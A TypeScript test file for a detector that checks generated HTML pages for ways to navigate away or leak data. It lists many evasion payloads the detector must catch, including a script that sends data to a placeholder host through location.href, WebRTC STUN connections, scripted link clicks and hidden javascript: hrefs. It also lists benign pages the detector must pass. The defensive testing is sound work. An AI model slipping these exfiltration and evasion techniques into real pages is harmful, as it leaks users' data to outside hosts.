import { describe, expect, it } from "vitest";

import { exitsIn } from "./htmlpage.js";

const script = (code: string): string => `<script>${code}</script>`;

/**
 * The write-time check of a page's way out. It has to refuse every way of
 * writing a navigation it can see, and let an ordinary page through: one that
 * says "location" in its words, or has a variable or a field by that name.
 */
describe("a page's ways out", () => {
  it("refuses navigation however it is written", () => {
    for (const html of [
      script("location.href = 'https://x.example/?d=' + data"),
      script("location = 'https://x.example'"),
      script("location.assign(u)"),
      script("window.location.replace(u)"),
      script("document.location = u"),
      script("self['location'] = u"),
      script("top.location.href = u"),
      script("globalThis.location.hash = u"),
      script("window.open('https://x.example')"),
      script("open('https://x.example')"),
      script("const a = document.createElement('a'); a.href = 'https://x.example'; a.target = '_blank'; a.click()"),
      script("a.setAttribute('href', 'https://x.example'); a.click()"),
      script('a.setAttribute("target", "_blank")'),
      script("el.setAttributeNS(null, 'href', u)"),
      script("new RTCPeerConnection({ iceServers: [{ urls: 'stun:x.example' }] })"),
      script("new webkitRTCPeerConnection({})"),
      script("document.querySelector('form').submit()"),
      script("navigation.navigate(u)"),
      // Code hidden after a regex literal that holds a quote is still read as code.
      script("const q = /'/; location.href = u; const r = /'/"),
      // And inside a template's expression.
      script("const s = `${(location.href = u)}`"),
      '<button onclick="location.assign(1)">go</button>',
      '<a href="javascript:location=1">x</a>',
      '<a href="https://x.example">x</a>',
      '<a href="//x.example">x</a>',
      '<a href="mailto:a@x.example">x</a>',
      '<link rel="prerender" href="https://x.example">',
      '<x:link xmlns:x="http://www.w3.org/1999/xhtml" rel="prerender" href="https://x.example"/>',
    ]) {
      expect(exitsIn(html), html).not.toEqual([]);
    }
  });

  it("lets ordinary words and code through", () => {
    for (const html of [
      "<p>Pick a location. Fill the form below, then open the list.</p>",
      script("const location = rows[0].location; render(location)"),
      script("rows.map((r) => r.location).join(', ')"),
      script("const label = 'Set location = home'; // location.href would be wrong here"),
      script("/* window.open(x) */ const opened = isOpen(1)"),
      script("const target = document.body; if (x == location) {}"),
      script("function open(row) { return row } class Panel { open() { } }"),
      script("el.setAttribute('aria-label', 'Open location')"),
      script("const re = /location\\.href/; const t = `at ${place.location}`"),
      '<a href="#totals">Totals</a>',
      '<img src="data:image/png;base64,AA" alt="">',
    ]) {
      expect(exitsIn(html), html).toEqual([]);
    }
  });
});
